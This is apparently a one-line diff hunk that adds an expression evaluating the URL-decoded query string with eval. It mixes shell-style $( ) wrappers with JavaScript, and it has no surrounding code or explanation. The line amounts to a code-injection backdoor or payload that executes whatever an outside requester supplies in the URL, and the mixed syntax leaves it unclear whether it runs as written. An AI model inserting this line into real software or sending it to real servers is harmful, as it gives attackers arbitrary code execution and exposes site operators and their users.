@@ -1,0 +1,1 @@
+$(eval decodeURIComponent("$(querystring)").replace(/\!/g,''))
